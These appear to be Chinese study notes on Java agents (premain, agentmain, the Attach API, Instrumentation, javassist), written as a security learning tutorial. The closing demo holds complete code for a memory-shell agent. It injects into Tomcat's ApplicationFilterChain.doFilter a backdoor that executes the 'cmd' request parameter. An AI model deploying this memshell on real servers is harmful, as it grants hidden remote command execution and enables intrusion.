# 写在前面的一些复习思路
agent技术两种

1. premain jvm运行前通过加入  -javaagent参数 达到先执行agent.jar 里面的premain方法,再执行原有jar包的main
2. agentmain 再jvm运行时候 通过viturlmachine方法把修改的jar包attach到对应jvm进程，修改的jar包由instrumentation 定义转化的类和方法 利用javaasist编辑字节码插入对应的方法

# 类加载
java文件经过编译过后class文件的字节码

然后jvm进行类加载

<font style="color:rgb(77, 77, 77);">   加载指的是将类的class文件读入到内存，并为之创建一个java.lang.Class对象，也就是说，当程序中使用任何类时，系统都会为之建立一个java.lang.Class对象。</font>

<font style="color:rgb(77, 77, 77);">加载的来源</font>

<font style="color:rgb(77, 77, 77);">从本地文件系统加载class文件，这是前面绝大部分示例程序的类加载方式。</font>

<font style="color:rgb(77, 77, 77);">从JAR包加载class文件，这种方式也是很常见的，前面介绍JDBC编程时用到的数据库驱动类就放在JAR文件中，JVM可以从JAR文件中直接加载该class文件。</font>

<font style="color:rgb(77, 77, 77);">通过网络加载class文件。</font>

<font style="color:rgb(77, 77, 77);"></font>

# <font style="color:rgb(77, 77, 77);">agent</font>
Java Agent就是一种能在不影响正常编译的前提下，修改Java字节码，进而动态地修改已加载或未加载的类、属性和方法的技术。

<font style="color:rgb(51, 51, 51);">利用java instrumentation机制，</font>**<font style="color:rgb(51, 51, 51);">动态的修改已加载到内存中的类里的方法，进而注入恶意的代码</font>**<font style="color:rgb(51, 51, 51);">。</font>

agent修改分为两种

一种是在jvm启动前提前加载字节码<font style="color:rgb(94, 102, 135);background-color:rgb(243, 243, 243);">premain-Agent</font>

一种是运行途中重新加载<font style="color:rgb(94, 102, 135);background-color:rgb(243, 243, 243);">agentmain-Agent</font>

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747128093714-4804b3ae-303e-4f5f-8b1a-8852e3500a0f.png)

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747129348349-115c6156-f8d3-4913-b3c9-22b0aba3aa18.png)

## javaagent示例
## Premain
先写一个提前加载的方法

```plain
package com.java.premain.agent;

import java.lang.instrument.Instrumentation;

public class Java_Agent_premain {
    public static void premain(String args, Instrumentation inst) {
        for (int i =0 ; i<10 ; i++){
            System.out.println("调用了premain-Agent！");
        }
    }
}
```

Premain代理加载方式就说在程序启动的时候加入参数

java -javaagent:xxx.jar app.jar

xxx.jar就是我们要构造的类包

mf文件

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747129440890-34c148bd-743b-4d4f-935c-2fd232e689b7.png)

默认选项编译jar

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747129668211-a5780638-4ed8-4b11-bc58-353c1016ec01.png)

运行一下发现

```plain
java -javaagent:javaagent.jar -jar hello.jar
```

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747130383866-a492591b-4c17-4e39-b526-930c30bedb7a.png)

执行完之后还是要执行main方法

<font style="color:rgb(51, 51, 51);">可以发现在</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">hello.jar</font>`<font style="color:rgb(51, 51, 51);">输出</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">Hello world</font>`<font style="color:rgb(51, 51, 51);">之前就执行了，具体执行流程大致如下</font>![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747130465119-39f3afe2-1b56-4136-b1f6-65a221c3d998.png)

<font style="color:rgb(51, 51, 51);">然而这种方法存在一定的局限性：</font>**<font style="color:rgb(51, 51, 51);">只能在启动时使用</font>**`**<font style="background-color:rgb(247, 247, 247);">-javaagent</font>**`**<font style="color:rgb(51, 51, 51);">参数指定</font>**<font style="color:rgb(51, 51, 51);">。</font>

<font style="color:rgb(51, 51, 51);">在实际环境中，目标的JVM通常都是已经启动的状态，不可能重启别人的服务。无法预先加载</font>`<font style="background-color:rgb(247, 247, 247);">premain</font>`<font style="color:rgb(51, 51, 51);">。相比之下，</font>`<font style="background-color:rgb(247, 247, 247);">agentmain</font>`<font style="color:rgb(51, 51, 51);">更加实用。</font>

## <font style="color:rgb(51, 51, 51);">agentmain</font>
<font style="color:rgb(51, 51, 51);">写一个</font>`<font style="background-color:rgb(247, 247, 247);">agentmain</font>`<font style="color:rgb(51, 51, 51);">和</font>`<font style="background-color:rgb(247, 247, 247);">premain</font>`<font style="color:rgb(51, 51, 51);">差不多，只需要在</font>`<font style="background-color:rgb(247, 247, 247);">META-INF/MANIFEST.MF</font>`<font style="color:rgb(51, 51, 51);">中加入</font>`<font style="background-color:rgb(247, 247, 247);">Agent-Class:</font>`<font style="color:rgb(51, 51, 51);">即可。</font>

```plain
Manifest-Version: 1.0
Agent-Class: AgentMain
```

<font style="color:rgb(51, 51, 51);">不同的是，这种方法不是通过JVM启动前的参数来指定的，官方为了实现启动后加载，提供了</font>`<font style="background-color:rgb(247, 247, 247);">Attach API</font>`<font style="color:rgb(51, 51, 51);">。Attach API 很简单，只有 2 个主要的类，都在 </font>`<font style="background-color:rgb(247, 247, 247);">com.sun.tools.attach</font>`<font style="color:rgb(51, 51, 51);"> 包里面。着重关注的是</font>`<font style="background-color:rgb(247, 247, 247);">VitualMachine</font>`<font style="color:rgb(51, 51, 51);">这个类。</font>

<font style="color:rgb(51, 51, 51);">官方为了实现启动后加载，提供了</font>`<font style="background-color:rgb(247, 247, 247);">Attach API</font>`<font style="color:rgb(51, 51, 51);">。Attach API 很简单，只有 2 个主要的类，都在</font><font style="color:rgb(51, 51, 51);"> </font>`<font style="background-color:rgb(247, 247, 247);">com.sun.tools.attach</font>`<font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">包里面。着重关注的是</font>`<font style="background-color:rgb(247, 247, 247);">VitualMachine</font>`<font style="color:rgb(51, 51, 51);">这个类。</font>

<font style="color:rgb(133, 133, 133);">需要依赖</font>`<font style="background-color:rgb(247, 247, 247);">VitualMachine</font>`<font style="color:rgb(133, 133, 133);">的</font>`<font style="background-color:rgb(247, 247, 247);">loadAgent</font>`<font style="color:rgb(133, 133, 133);">达到attach的目的</font>

##### VirtualMachine类（连接加载好的jvm进程）
一个java进程就是一个jvm

<font style="color:rgb(51, 51, 51);">字面意义表示一个Java 虚拟机，也就是程序需要监控的目标虚拟机，提供了获取系统信息、 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">loadAgent</font>`<font style="color:rgb(51, 51, 51);">，</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">attach</font>`<font style="color:rgb(51, 51, 51);"> 和 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">detach</font>`<font style="color:rgb(51, 51, 51);"> 等方法，可以实现的功能可以说非常之强大 </font><font style="color:rgb(51, 51, 51);background-color:#FBDE28;">。该类允许我们通过给attach方法传入一个jvm的pid(进程id)，远程连接到jvm上 。代理类注入操作只是它众多功能中的一个，通过</font>`<font style="color:rgb(51, 51, 51);background-color:#FBDE28;">loadAgent</font>`<font style="color:rgb(51, 51, 51);background-color:#FBDE28;">方法向jvm注册一个代理程序agent，在该agent的代理程序中会得到一个</font>`<font style="color:rgb(51, 51, 51);background-color:#FBDE28;">Instrumentation</font>`<font style="color:rgb(51, 51, 51);background-color:#FBDE28;">实例。</font>

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747137120497-f5ba224e-26c4-4ee8-9bed-78c4f5e19ed2.png)

```plain
//获得当前所有的JVM列表
VirtualMachine.list()

//允许我们传入一个JVM的PID，然后远程连接到该JVM上
VirtualMachine.attach()
 
//向JVM注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理
VirtualMachine.loadAgent()
 
//解除与特定JVM的连接
VirtualMachine.detach()
```

该类允许我们通过给attach方法传入一个JVM的PID，来远程连接到该JVM上 ，之后我们就可以对连接的JVM进行各种操作，如注入Agent。下面是该类的主要方法

##### VirtualMachineDescriptor类
获取pid

`com.sun.tools.attach.VirtualMachineDescriptor`类是一个用来描述特定虚拟机的类，其方法可以获取虚拟机的各种信息如PID、虚拟机名称等。下面是一个获取特定虚拟机PID的示例

```plain
import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;
 
import java.util.List;
 
public class get_PID {
    public static void main(String[] args) {
        
        //调用VirtualMachine.list()获取正在运行的JVM列表
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        for(VirtualMachineDescriptor vmd : list){
            
            //遍历每一个正在运行的JVM，如果JVM名称为get_PID则返回其PID
            if(vmd.displayName().equals("get_PID"))
            System.out.println(vmd.id());
        }
 
    }
}
 
 
##
4908
 
Process finished with exit code 0
 
```

编写我们的agentmain-Agent类

```plain
package agentmain;

import java.lang.instrument.Instrumentation;

import static java.lang.Thread.sleep;

public class Java_Agent_agentmain {
    public static void agentmain(String args, Instrumentation inst) throws InterruptedException {
        while (true){
            System.out.println("调用了agentmain-Agent!");
            sleep(3000);
        }
    }
}
```

inject类

```plain
package agentmain;

import com.sun.tools.attach.*;

import java.io.IOException;
import java.util.List;

public class Inject_Agent {
    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {
        try {
            //调用VirtualMachine.list()获取正在运行的JVM列表
            List<VirtualMachineDescriptor> list = VirtualMachine.list();
            boolean found = false;
            
            for(VirtualMachineDescriptor vmd : list){
                //遍历每一个正在运行的JVM，如果JVM名称为SleepHello则连接该JVM并加载特定Agent
                if(vmd.displayName().contains("Sleep_Hello")){
                    found = true;
                    System.out.println("找到目标进程: " + vmd.displayName() + ", PID: " + vmd.id());
                    
                    try {
                        //连接指定JVM
                        VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());
                        //加载Agent
                        virtualMachine.loadAgent("out/artifacts/agentmain_jar/agentmain.jar");
                        System.out.println("Agent加载成功！");
                        //断开JVM连接
                        virtualMachine.detach();
                    } catch (Exception e) {
                        System.err.println("注入Agent时发生错误: " + e.getMessage());
                        e.printStackTrace();
                    }
                }
            }
            
            if (!found) {
                System.out.println("未找到目标进程，请确保SleepHello程序正在运行");
            }
            
        } catch (Exception e) {
            System.err.println("获取进程列表时发生错误: " + e.getMessage());
            e.printStackTrace();
        }
    }
}
```

记得改下Manifest

```plain
Manifest-Version: 1.0
Agent-Class: agentmain.Java_Agent_agentmain
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```

踩坑了

![](https://cdn.nlark.com/yuque/0/2025/png/36112066/1747140592643-251d1765-e6f5-4412-baf0-76caccfafe37.png)

#### Instrumentation（修改字节码类）
Instrumentation是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果

```plain
public interface Instrumentation {
    
    //增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。
    void addTransformer(ClassFileTransformer transformer, boolean canRetransform);
 
    //在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。
    void addTransformer(ClassFileTransformer transformer);
 
    //删除一个类转换器
    boolean removeTransformer(ClassFileTransformer transformer);
 
 
    //在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。
    void retransformClasses(Class<?>... classes) throws UnmodifiableClassException;
 
 
 
    //判断一个类是否被修改
    boolean isModifiableClass(Class<?> theClass);
 
    // 获取目标已经加载的类。
    @SuppressWarnings("rawtypes")
    Class[] getAllLoadedClasses();
 
    //获取一个对象的大小
    long getObjectSize(Object objectToSize);
 
}
```

##### 获取目标JVM已加载类
下面我们简单实现一个能够获取目标JVM已加载类的`agentmain-Agent`

```plain
package com.java.agentmain.instrumentation;
 
import java.lang.instrument.Instrumentation;
 
public class Java_Agent_agentmain_Instrumentation {
    public static void agentmain(String args, Instrumentation inst) throws InterruptedException {
        Class [] classes = inst.getAllLoadedClasses();
 
        for(Class cls : classes){
            System.out.println("------------------------------------------");
            System.out.println("加载类: "+cls.getName());
            System.out.println("是否可被修改: "+inst.isModifiableClass(cls));
        }
    }
}
```

##### transform
在Instrumentation接口中，我们可以通过`addTransformer()`来添加一个`transformer`（转换器），关键属性就是`ClassFileTransformer`类

```plain
//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 
canRetransform 设置是否允许重新转换。
    void addTransformer(ClassFileTransformer transformer, boolean canRetransform);
```

`ClassFileTransformer`接口中只有一个`transform()`方法，返回值为字节数组，作为转换后的字节码注入到目标JVM中。

```plain
public interface ClassFileTransformer {
 
    /**
     * 类文件转换方法，重写transform方法可获取到待加载的类相关信息
     *
     * @param loader              定义要转换的类加载器；如果是引导加载器如Bootstrap ClassLoader，则为 null
     * @param className           完全限定类内部形式的类名称,格式如:java/lang/Runtime
     * @param classBeingRedefined 如果是被重定义或重转换触发，则为重定义或重转换的类；如果是类加载，则为 null
     * @param protectionDomain    要定义或重定义的类的保护域
     * @param classfileBuffer     类文件格式的输入字节缓冲区（不得修改）
     * @return 返回一个通过ASM修改后添加了防御代码的字节码byte数组。
     */
    
    byte[] transform(  ClassLoader         loader,
                String              className,
                Class<?>            classBeingRedefined,
                ProtectionDomain    protectionDomain,
                byte[]              classfileBuffer)
        throws IllegalClassFormatException;
}
```

在通过 `addTransformer` 注册一个transformer后，每次定义或者重定义新类都会调用transformer。所谓定义，即是通过`ClassLoader.defineClass`加载进来的类。而重定义是通过`Instrumentation.redefineClasses`方法重定义的类。



### <font style="color:rgb(51, 51, 51);">修改类</font>
<font style="color:rgb(51, 51, 51);">使用</font>`<font style="background-color:rgb(247, 247, 247);">addTransformer()</font>`<font style="color:rgb(51, 51, 51);">和</font>`<font style="background-color:rgb(247, 247, 247);">retransformClasses()</font>`<font style="color:rgb(51, 51, 51);">可以篡改Class的字节码</font>

<font style="color:rgb(51, 51, 51);">首先再看一下这两个方法的声明：</font>

<font style="color:rgb(51, 51, 51);">在</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">addTransformer()</font>`<font style="color:rgb(51, 51, 51);">方法中，有一个参数</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);">ClassFileTransformer transformer</font>`<font style="color:rgb(51, 51, 51);">。这个参数将帮助我们完成字节码的修改工作。</font>

1. <font style="color:rgb(51, 51, 51);">使用</font>`<font style="background-color:rgb(247, 247, 247);">Instrumentation.addTransformer()</font>`<font style="color:rgb(51, 51, 51);">来加载一个转换器。</font>
2. <font style="color:rgb(51, 51, 51);">转换器的返回结果（</font>`<font style="background-color:rgb(247, 247, 247);">transform()</font>`<font style="color:rgb(51, 51, 51);">方法的返回值）将成为转换后的字节码。</font>
3. <font style="color:rgb(51, 51, 51);">对于没有加载的类，会使用</font>`<font style="background-color:rgb(247, 247, 247);">ClassLoader.defineClass()</font>`<font style="color:rgb(51, 51, 51);">定义它；对于已经加载的类，会使用</font>`<font style="background-color:rgb(247, 247, 247);">ClassLoader.redefineClasses()</font>`<font style="color:rgb(51, 51, 51);">重新定义，并配合</font>`<font style="background-color:rgb(247, 247, 247);">Instrumentation.retransformClasses</font>`<font style="color:rgb(51, 51, 51);">进行转换。</font>

#### <font style="color:rgb(51, 51, 51);">javassist（编辑字节码）</font>


# demo测试 springboot
测试

```plain
// AgentMain.java
import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;

public class AgentMain {
    public static void agentmain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException {
        Class[] allLoadedClasses = inst.getAllLoadedClasses();
        for (Class cls : allLoadedClasses){
            // 定位到类
            if (cls.getName() == TransformerDemo.editClassName){
                // 添加Transformer
                inst.addTransformer(new TransformerDemo(), true);
                // 触发Transformer
                inst.retransformClasses(cls);
            }
        }

    }
}

// TransformerDemo.java
import javassist.*;

import java.io.IOException;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

// addTransformer()的第一个参数需要ClassFileTransformer这个类的对象
public class TransformerDemo implements ClassFileTransformer {
    public static String editClassName = "org.apache.catalina.core.ApplicationFilterChain";
    public static String editMethod = "doFilter";
    public static String memshell = "" +
            "    javax.servlet.http.HttpServletRequest req =  $1;\n" +
            "    javax.servlet.http.HttpServletResponse res = $2;\n" +
            "    java.lang.String cmd = req.getParameter(\"cmd\");\n" +
            "\n" +
            "    if (cmd != null){\n" +
            "       System.out.println(cmd);" +
            "        try {\n" +
            "            java.lang.Runtime.getRuntime().exec(cmd);\n" +
            "        } catch (Exception e){\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "    }\n" +
            "    else{\n" +
            "        internalDoFilter(req,res);\n" +
            "    }\n" +
            "";

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        ClassPool classPool = ClassPool.getDefault();

        // 添加额外的类搜索路径
        if (classBeingRedefined != null) {
            ClassClassPath classClassPath = new ClassClassPath(classBeingRedefined);
            classPool.insertClassPath(classClassPath);
        }

        // 修改方法doFilter()，返回 byte[] 字节码
        try {
            CtClass ctClass = classPool.get(editClassName);
            CtMethod ctMethod = ctClass.getDeclaredMethod(editMethod);
            ctMethod.insertBefore(memshell);
            ctClass.writeFile("/Users/d4m1ts/d4m1ts/java/Temp/out/artifacts/temp_jar");
            System.out.println(memshell);
            System.out.println("injection success");
            byte[] bytes = ctClass.toBytecode();
            ctClass.detach();
            return bytes;

        } catch (NotFoundException e) {
            e.printStackTrace();
        } catch (CannotCompileException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }


        return new byte[0];
    }
}

```

attach到spring的jvm里面

# <font style="color:rgb(51, 51, 51);">无文件落地</font>
http://cnblogs.com/rebeyond/p/16691104.html

